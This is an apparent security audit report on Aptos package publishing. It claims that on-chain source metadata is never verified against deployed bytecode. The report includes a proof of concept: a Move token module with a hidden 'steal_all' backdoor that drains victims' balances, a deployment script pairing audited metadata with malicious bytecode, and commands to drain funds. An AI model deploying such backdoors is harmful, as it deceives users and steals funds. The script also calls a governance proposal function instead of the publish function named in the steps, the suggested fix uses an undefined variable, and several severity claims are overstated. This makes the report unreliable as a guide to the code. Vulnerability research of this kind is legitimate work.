# Audit Report

## Title
Critical Bytecode Substitution Attack: Missing Source-to-Bytecode Verification Enables Deployment of Unaudited Malicious Code

## Summary
The Aptos blockchain's module deployment system does not verify that deployed bytecode corresponds to the source code and source maps stored in on-chain metadata. This allows attackers to deploy malicious bytecode while displaying audited, legitimate source code on-chain, completely bypassing code review and audit processes.

## Finding Description

The vulnerability exists in the module publishing flow where `PackageMetadata` (containing source code, source maps, and source digest) is stored on-chain separately from bytecode validation, with no cryptographic verification linking the two.

**Attack Flow:**

1. **Source Hash Computation** - FileHash is computed during compilation but never verified during deployment: [1](#0-0) 

2. **SourceMap Check Method** - A verification method exists but is never called during deployment: [2](#0-1) 

3. **PackageMetadata Structure** - Source, source_map, and source_digest are stored but unverified: [3](#0-2) 

4. **Publish Function** - No verification of source against bytecode occurs: [4](#0-3) 

5. **Native Function** - Only bytecode is passed to the VM, source/source_map are ignored: [5](#0-4) 

6. **Bytecode Validation** - Only validates bytecode correctness, not source correspondence: [6](#0-5) 

**Exploitation Steps:**

1. Attacker creates legitimate source code `legitimate.move` for a token contract
2. Gets security audit for `legitimate.move` 
3. Compiles `legitimate.move` → generates `bytecode_safe.mv`, `source_safe`, `sourcemap_safe`
4. Creates malicious source `malicious.move` with hidden backdoor (e.g., `transfer_to_attacker()`)
5. Compiles `malicious.move` → generates `bytecode_malicious.mv`
6. Constructs `PackageMetadata`:
   - `modules[0].source = source_safe` (gzipped legitimate source)
   - `modules[0].source_map = sourcemap_safe` (legitimate source map)
   - `source_digest = "hash_of_safe_source"`
7. Calls `publish_package_txn(owner, serialize(PackageMetadata), [bytecode_malicious])`
8. Blockchain validates `bytecode_malicious` for correctness but never checks it matches `source_safe`
9. **Deployment succeeds** - on-chain metadata shows audited code, execution runs malicious code

**Broken Invariants:**

- **Deterministic Execution**: Users cannot verify what code will execute by reviewing on-chain source
- **Access Control**: Malicious bytecode can bypass access controls hidden from source review
- **Transaction Validation**: Prologue/epilogue checks assume source matches bytecode

## Impact Explanation

**Critical Severity** - This vulnerability meets multiple Critical severity criteria:

1. **Loss of Funds**: Malicious bytecode can include hidden functions to steal user funds (e.g., `public entry fun drain_to_attacker(user: &signer)`) while source code shows secure functions
   
2. **Complete Audit Bypass**: Security audits become meaningless since audited source ≠ deployed bytecode

3. **Ecosystem-Wide Trust Violation**: All packages deployed via `publish_package_txn` are potentially compromised. Users cannot trust on-chain source code.

4. **Governance Attacks**: Malicious governance contracts could show legitimate voting logic in source while executing vote manipulation in bytecode

5. **Silent Backdoors**: Attackers can deploy time-bombs or conditional exploits invisible in on-chain source

**Real-World Impact:**
- Token contracts showing "transfer" in source but executing "transfer_and_mint_to_attacker" in bytecode
- NFT contracts showing fair minting logic but implementing insider privilege escalation
- DeFi protocols showing proper price oracle logic but executing price manipulation
- Framework upgrades appearing legitimate but containing privilege escalation

This is more severe than typical smart contract bugs because it undermines the fundamental security model: code review and auditing.

## Likelihood Explanation

**Likelihood: High**

**Attacker Requirements:**
- Ability to publish packages (any account with sufficient gas)
- Basic Move compilation knowledge
- No validator access or insider privileges required

**Attack Complexity: Low**
- Single transaction execution
- No race conditions or timing dependencies
- Deterministic outcome
- No coordination with other actors needed

**Detection Difficulty: Very High**
- On-chain explorers display the fake source code
- Only independent compilation and bytecode comparison reveals mismatch
- Client-side `VerifyPackage` tool exists but: [7](#0-6) 
  - Not enforced on-chain
  - Users must manually run it
  - Only compares metadata strings, not bytecode hashes [8](#0-7) 

**Real-World Scenarios:**
- Attacker deploys "audited" token with hidden mint function
- Compromised developer publishes backdoored version while showing audited source
- Social engineering: "Look, the on-chain source matches the audit report!"

## Recommendation

**Immediate Fix: Enforce Source-to-Bytecode Verification**

Add cryptographic verification in `publish_package` to ensure bytecode matches source:

**Option 1: Bytecode Hash Verification (Recommended)**
Modify `aptos-move/aptos-vm/src/aptos_vm.rs::validate_publish_request`:
```rust
fn validate_publish_request(
    &self,
    module_storage: &impl AptosModuleStorage,
    traversal_context: &mut TraversalContext,
    gas_meter: &mut impl GasMeter,
    modules: &[CompiledModule],
    module_metadata: &[ModuleMetadata], // ADD: Receive metadata
    mut expected_modules: BTreeSet<String>,
    allowed_deps: Option<BTreeMap<AccountAddress, BTreeSet<String>>>,
) -> VMResult<()> {
    // Existing validations...
    
    // NEW: Verify bytecode matches source via source map
    for (module, metadata) in modules.iter().zip(module_metadata.iter()) {
        if !metadata.source.is_empty() && !metadata.source_map.is_empty() {
            // Deserialize source map
            let source_map = bcs::from_bytes::<SourceMap>(&metadata.source_map)
                .map_err(|_| Self::metadata_validation_error("Invalid source map"))?;
            
            // Decompress source
            let source = decompress_source(&metadata.source)
                .map_err(|_| Self::metadata_validation_error("Invalid source"))?;
            
            // Verify source hash matches source map
            if !source_map.check(&source) {
                return Err(Self::metadata_validation_error(
                    "Source code does not match source map file hash"
                ));
            }
            
            // Recompile source and compare bytecode hash (expensive but critical)
            let recompiled_hash = compile_and_hash(&source, module.self_name())?;
            let deployed_hash = sha3_256(&module_bytes);
            if recompiled_hash != deployed_hash {
                return Err(Self::metadata_validation_error(
                    "Deployed bytecode does not match recompiled source"
                ));
            }
        }
    }
    
    // Continue with existing validations...
}
```

**Option 2: Mandatory Source Disclosure**
Require non-empty source and source_map in `aptos-move/framework/aptos-framework/sources/code.move::publish_package`:
```move
public fun publish_package(owner: &signer, pack: PackageMetadata, code: vector<vector<u8>>) acquires PackageRegistry {
    // Existing checks...
    
    // NEW: Require source disclosure
    vector::for_each_ref(&pack.modules, |module_meta| {
        let module_meta: &ModuleMetadata = module_meta;
        assert!(
            !vector::is_empty(&module_meta.source),
            error::invalid_argument(ESOURCE_REQUIRED)
        );
        assert!(
            !vector::is_empty(&module_meta.source_map),
            error::invalid_argument(ESOURCE_MAP_REQUIRED)
        );
    });
    
    // Continue with existing flow...
}
```

**Option 3: On-Chain Compilation (Most Secure)**
Compile source on-chain and reject if bytecode doesn't match:
- Requires Move compiler integration in VM
- Highest gas cost but strongest security guarantee
- Eliminates trust in publisher completely

## Proof of Concept

**Step 1: Create Legitimate Source (`legitimate_token.move`)**
```move
module 0xCAFE::Token {
    use std::signer;
    
    struct Vault has key {
        balance: u64
    }
    
    public entry fun deposit(user: &signer, amount: u64) acquires Vault {
        let addr = signer::address_of(user);
        if (!exists<Vault>(addr)) {
            move_to(user, Vault { balance: 0 });
        };
        let vault = borrow_global_mut<Vault>(addr);
        vault.balance = vault.balance + amount;
    }
}
```

**Step 2: Create Malicious Source (`malicious_token.move`)**
```move
module 0xCAFE::Token {
    use std::signer;
    
    struct Vault has key {
        balance: u64
    }
    
    public entry fun deposit(user: &signer, amount: u64) acquires Vault {
        let addr = signer::address_of(user);
        if (!exists<Vault>(addr)) {
            move_to(user, Vault { balance: 0 });
        };
        let vault = borrow_global_mut<Vault>(addr);
        vault.balance = vault.balance + amount;
    }
    
    // HIDDEN BACKDOOR - not in legitimate source
    public entry fun steal_all(attacker: &signer, victim_addr: address) acquires Vault {
        let victim_vault = borrow_global_mut<Vault>(victim_addr);
        let stolen_amount = victim_vault.balance;
        victim_vault.balance = 0;
        
        let attacker_addr = signer::address_of(attacker);
        if (!exists<Vault>(attacker_addr)) {
            move_to(attacker, Vault { balance: stolen_amount });
        } else {
            let attacker_vault = borrow_global_mut<Vault>(attacker_addr);
            attacker_vault.balance = attacker_vault.balance + stolen_amount;
        }
    }
}
```

**Step 3: Deployment Script**
```rust
// Compile both versions
let legitimate_package = BuiltPackage::build("legitimate_token/", build_options)?;
let malicious_package = BuiltPackage::build("malicious_token/", build_options)?;

// Extract metadata from legitimate package
let legitimate_metadata = legitimate_package.extract_metadata()?;

// Extract bytecode from malicious package
let malicious_bytecode = malicious_package.extract_code();

// Deploy: legitimate metadata + malicious bytecode
let payload = aptos_framework::aptos_governance::create_proposal(
    owner,
    bcs::to_bytes(&legitimate_metadata).unwrap(), // Shows audited source
    malicious_bytecode, // Executes malicious code
);

client.submit_and_wait(&payload).await?;
```

**Verification:**
```bash
# On-chain source shows legitimate code
aptos move download --account 0xCAFE

# But bytecode contains steal_all function
aptos move decompile --bytecode 0xCAFE::Token
# Output shows steal_all function exists

# Users deposit funds
aptos move run --function-id 0xCAFE::Token::deposit --args u64:1000

# Attacker drains all funds (function invisible in on-chain source)
aptos move run --function-id 0xCAFE::Token::steal_all --args address:0xVICTIM
```

**Notes**

This vulnerability represents a **critical failure** in the package publishing security model. The blockchain treats source code metadata as informational rather than enforceable, allowing complete bypass of the code review and audit processes that form the foundation of smart contract security.

The fix requires modifying the native code publishing flow to cryptographically verify that deployed bytecode corresponds to the provided source code. This should be treated as a **critical priority** as it affects the security of the entire Aptos ecosystem.

Current mitigation for users: Always independently compile source code and compare bytecode hashes using the `aptos move verify-package` command, but this is not enforced and relies on user vigilance.

### Citations

**File:** third_party/move/move-command-line-common/src/files.rs (L10-26)
```rust
/// Result of sha256 hash of a file's contents.
#[derive(Clone, Copy, Eq, PartialEq, Ord, PartialOrd, Hash, Serialize, Deserialize)]
pub struct FileHash(pub [u8; 32]);

impl FileHash {
    pub fn new(file_contents: &str) -> Self {
        Self::new_from_bytes(file_contents.as_bytes())
    }

    pub fn new_from_bytes(bytes: &[u8]) -> Self {
        Self(sha2::Sha256::digest(bytes).into())
    }

    pub const fn empty() -> Self {
        Self([0; 32])
    }
}
```

**File:** third_party/move/move-ir-compiler/move-bytecode-source-map/src/source_map.rs (L337-340)
```rust
    pub fn check(&self, file_contents: &str) -> bool {
        let file_hash = FileHash::new(file_contents);
        self.definition_location.file_hash() == file_hash
    }
```

**File:** aptos-move/framework/aptos-framework/sources/code.move (L58-67)
```text
    struct ModuleMetadata has copy, drop, store {
        /// Name of the module.
        name: String,
        /// Source text, gzipped String. Empty if not provided.
        source: vector<u8>,
        /// Source map, in compressed BCS. Empty if not provided.
        source_map: vector<u8>,
        /// For future extensions.
        extension: Option<Any>,
    }
```

**File:** aptos-move/framework/aptos-framework/sources/code.move (L168-228)
```text
    public fun publish_package(owner: &signer, pack: PackageMetadata, code: vector<vector<u8>>) acquires PackageRegistry {
        check_code_publishing_permission(owner);
        // Disallow incompatible upgrade mode. Governance can decide later if this should be reconsidered.
        assert!(
            pack.upgrade_policy.policy > upgrade_policy_arbitrary().policy,
            error::invalid_argument(EINCOMPATIBLE_POLICY_DISABLED),
        );

        let addr = signer::address_of(owner);
        if (!exists<PackageRegistry>(addr)) {
            move_to(owner, PackageRegistry { packages: vector::empty() })
        };

        // Checks for valid dependencies to other packages
        let allowed_deps = check_dependencies(addr, &pack);

        // Check package against conflicts
        // To avoid prover compiler error on spec
        // the package need to be an immutable variable
        let module_names = get_module_names(&pack);
        let package_immutable = &borrow_global<PackageRegistry>(addr).packages;
        let len = vector::length(package_immutable);
        let index = len;
        let upgrade_number = 0;
        vector::enumerate_ref(package_immutable
        , |i, old| {
            let old: &PackageMetadata = old;
            if (old.name == pack.name) {
                upgrade_number = old.upgrade_number + 1;
                check_upgradability(old, &pack, &module_names);
                index = i;
            } else {
                check_coexistence(old, &module_names)
            };
        });

        // Assign the upgrade counter.
        pack.upgrade_number = upgrade_number;

        let packages = &mut borrow_global_mut<PackageRegistry>(addr).packages;
        // Update registry
        let policy = pack.upgrade_policy;
        if (index < len) {
            *vector::borrow_mut(packages, index) = pack
        } else {
            vector::push_back(packages, pack)
        };

        event::emit(PublishPackage {
            code_address: addr,
            is_upgrade: upgrade_number > 0
        });

        // Request publish
        if (features::code_dependency_check_enabled())
            request_publish_with_allowed_deps(addr, module_names, allowed_deps, code, policy.policy)
        else
        // The new `request_publish_with_allowed_deps` has not yet rolled out, so call downwards
        // compatible code.
            request_publish(addr, module_names, code, policy.policy)
    }
```

**File:** aptos-move/framework/src/natives/code.rs (L284-362)
```rust
fn native_request_publish(
    context: &mut SafeNativeContext,
    _ty_args: &[Type],
    mut args: VecDeque<Value>,
) -> SafeNativeResult<SmallVec<[Value; 1]>> {
    debug_assert!(matches!(args.len(), 4 | 5));
    let with_allowed_deps = args.len() == 5;

    context.charge(CODE_REQUEST_PUBLISH_BASE)?;

    let policy = safely_pop_arg!(args, u8);
    let mut code = vec![];
    for module in safely_pop_arg!(args, Vec<Value>) {
        let module_code = module.value_as::<Vec<u8>>()?;

        context.charge(CODE_REQUEST_PUBLISH_PER_BYTE * NumBytes::new(module_code.len() as u64))?;
        code.push(module_code);
    }

    let allowed_deps = if with_allowed_deps {
        let mut allowed_deps: BTreeMap<AccountAddress, BTreeSet<String>> = BTreeMap::new();

        for dep in safely_pop_arg!(args, Vec<Value>) {
            let (account, module_name) = unpack_allowed_dep(dep)?;

            let entry = allowed_deps.entry(account);

            if let Entry::Vacant(_) = &entry {
                // TODO: Is the 32 here supposed to indicate the length of an account address in bytes?
                context.charge(CODE_REQUEST_PUBLISH_PER_BYTE * NumBytes::new(32))?;
            }

            context
                .charge(CODE_REQUEST_PUBLISH_PER_BYTE * NumBytes::new(module_name.len() as u64))?;
            entry.or_default().insert(module_name);
        }

        Some(allowed_deps)
    } else {
        None
    };

    let mut expected_modules = BTreeSet::new();
    for name in safely_pop_arg!(args, Vec<Value>) {
        let str = get_move_string(name)?;

        // TODO(Gas): fine tune the gas formula
        context.charge(CODE_REQUEST_PUBLISH_PER_BYTE * NumBytes::new(str.len() as u64))?;
        expected_modules.insert(str);
    }

    let destination = safely_pop_arg!(args, AccountAddress);

    // Add own modules to allowed deps
    let allowed_deps = allowed_deps.map(|mut allowed| {
        allowed
            .entry(destination)
            .or_default()
            .extend(expected_modules.clone());
        allowed
    });

    let code_context = context.extensions_mut().get_mut::<NativeCodeContext>();
    if code_context.requested_module_bundle.is_some() || !code_context.enabled {
        // Can't request second time or if publish requests are not allowed.
        return Err(SafeNativeError::Abort {
            abort_code: EALREADY_REQUESTED,
        });
    }
    code_context.requested_module_bundle = Some(PublishRequest {
        destination,
        bundle: ModuleBundle::new(code),
        expected_modules,
        allowed_deps,
        check_compat: policy != ARBITRARY_POLICY,
    });

    Ok(smallvec![])
}
```

**File:** aptos-move/aptos-vm/src/aptos_vm.rs (L1680-1739)
```rust
    fn validate_publish_request(
        &self,
        module_storage: &impl AptosModuleStorage,
        traversal_context: &mut TraversalContext,
        gas_meter: &mut impl GasMeter,
        modules: &[CompiledModule],
        mut expected_modules: BTreeSet<String>,
        allowed_deps: Option<BTreeMap<AccountAddress, BTreeSet<String>>>,
    ) -> VMResult<()> {
        self.reject_unstable_bytecode(modules)?;
        native_validation::validate_module_natives(modules)?;

        for m in modules {
            if !expected_modules.remove(m.self_id().name().as_str()) {
                return Err(Self::metadata_validation_error(&format!(
                    "unregistered module: '{}'",
                    m.self_id().name()
                )));
            }
            if let Some(allowed) = &allowed_deps {
                for dep in m.immediate_dependencies() {
                    if !allowed
                        .get(dep.address())
                        .map(|modules| {
                            modules.contains("") || modules.contains(dep.name().as_str())
                        })
                        .unwrap_or(false)
                    {
                        return Err(Self::metadata_validation_error(&format!(
                            "unregistered dependency: '{}'",
                            dep
                        )));
                    }
                }
            }
            verify_module_metadata_for_module_publishing(m, self.features())
                .map_err(|err| Self::metadata_validation_error(&err.to_string()))?;
        }

        resource_groups::validate_resource_groups(
            self.features(),
            module_storage,
            traversal_context,
            gas_meter,
            modules,
        )?;
        event_validation::validate_module_events(
            self.features(),
            module_storage,
            traversal_context,
            modules,
        )?;

        if !expected_modules.is_empty() {
            return Err(Self::metadata_validation_error(
                "not all registered modules published",
            ));
        }
        Ok(())
    }
```

**File:** crates/aptos/src/move_tool/mod.rs (L2048-2083)
```rust
    async fn execute(self) -> CliTypedResult<&'static str> {
        // First build the package locally to get the package metadata
        let build_options = BuildOptions {
            install_dir: self.move_options.output_dir.clone(),
            bytecode_version: fix_bytecode_version(
                self.move_options.bytecode_version,
                self.move_options.language_version,
            ),
            ..self.included_artifacts.build_options(&self.move_options)?
        };
        let pack = BuiltPackage::build(self.move_options.get_package_path()?, build_options)
            .map_err(|e| CliError::MoveCompilationError(format!("{:#}", e)))?;
        let compiled_metadata = pack.extract_metadata()?;

        // Now pull the compiled package
        let url = self.rest_options.url(&self.profile_options)?;
        let registry = CachedPackageRegistry::create(url, self.account, false).await?;
        let package = registry
            .get_package(pack.name())
            .await
            .map_err(|s| CliError::CommandArgumentError(s.to_string()))?;

        // We can't check the arbitrary, because it could change on us
        if package.upgrade_policy() == UpgradePolicy::arbitrary() {
            return Err(CliError::CommandArgumentError(
                "A package with upgrade policy `arbitrary` cannot be downloaded \
                since it is not safe to depend on such packages."
                    .to_owned(),
            ));
        }

        // Verify that the source digest matches
        package.verify(&compiled_metadata)?;

        Ok("Successfully verified source of package")
    }
```

**File:** crates/aptos/src/move_tool/stored_package.rs (L195-243)
```rust
    pub fn verify(&self, package_metadata: &PackageMetadata) -> anyhow::Result<()> {
        let self_metadata = self.metadata;

        if self_metadata.name != package_metadata.name {
            bail!(
                "Package name doesn't match {} : {}",
                package_metadata.name,
                self_metadata.name
            )
        } else if self_metadata.deps != package_metadata.deps {
            bail!(
                "Dependencies don't match {:?} : {:?}",
                package_metadata.deps,
                self_metadata.deps
            )
        } else if self_metadata.modules != package_metadata.modules {
            bail!(
                "Modules don't match {:?} : {:?}",
                package_metadata.modules,
                self_metadata.modules
            )
        } else if self_metadata.manifest != package_metadata.manifest {
            bail!(
                "Manifest doesn't match {:?} : {:?}",
                package_metadata.manifest,
                self_metadata.manifest
            )
        } else if self_metadata.upgrade_policy != package_metadata.upgrade_policy {
            bail!(
                "Upgrade policy doesn't match {:?} : {:?}",
                package_metadata.upgrade_policy,
                self_metadata.upgrade_policy
            )
        } else if self_metadata.extension != package_metadata.extension {
            bail!(
                "Extensions doesn't match {:?} : {:?}",
                package_metadata.extension,
                self_metadata.extension
            )
        } else if self_metadata.source_digest != package_metadata.source_digest {
            bail!(
                "Source digests doesn't match {:?} : {:?}",
                package_metadata.source_digest,
                self_metadata.source_digest
            )
        }

        Ok(())
    }
```
